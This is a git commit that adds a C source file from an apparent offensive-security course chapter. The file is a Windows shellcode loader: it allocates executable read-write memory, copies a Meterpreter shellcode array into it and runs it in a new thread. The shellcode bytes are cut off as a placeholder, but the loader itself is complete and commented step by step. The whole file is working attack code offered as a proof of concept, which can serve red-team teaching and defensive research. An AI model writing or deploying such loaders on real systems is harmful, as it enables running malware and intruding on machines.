c364e8c4a59560b2cb6874ed424f3144e1c356d8
VirtualAllocEx <50073731+VirtualAlllocEx@users.noreply.github.com>
2023-07-05 18:41:47 +0200

    Add files via upload

---
+++ 01-Chapter_1_POC/Win32API-Loader/Win32API-Loader/Win32API-Loader.c
@@ -0,0 +1,40 @@
+#include <stdio.h>
+#include <windows.h>
+
+// Define the thread function for executing shellcode
+// This function will be executed in a separate thread created later in the main function
+DWORD WINAPI ExecuteShellcode(LPVOID lpParam) {
+    // Create a function pointer called 'shellcode' and initialize it with the address of the shellcode
+    void (*shellcode)() = (void (*)())lpParam;
+
+    // Call the shellcode function using the function pointer
+    shellcode();
+
+    return 0;
+}
+
+int main() {
+    // Insert the Meterpreter shellcode 
+    unsigned char code[] = "\xfc\x48\x83...";
+
+
+    // Allocate Virtual Memory with PAGE_EXECUTE_READWRITE permissions to store the shellcode
+    // 'exec' will hold the base address of the allocated memory region
+    void* exec = VirtualAlloc(0, sizeof(code), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+    // Copy the shellcode into the allocated memory region using WriteProcessMemory
+    SIZE_T bytesWritten;
+    WriteProcessMemory(GetCurrentProcess(), exec, code, sizeof(code), &bytesWritten);
+
+    // Create a new thread to execute the shellcode
+    // Pass the address of the ExecuteShellcode function as the thread function, and 'exec' as its parameter
+    // The returned handle of the created thread is stored in hThread
+    HANDLE hThread = CreateThread(NULL, 0, ExecuteShellcode, exec, 0, NULL);
+
+    // Wait for the shellcode execution thread to finish executing
+    // This ensures the main thread doesn't exit before the shellcode has finished running
+    WaitForSingleObject(hThread, INFINITE);
+
+    // Return 0 as the main function exit code
+    return 0;
+}
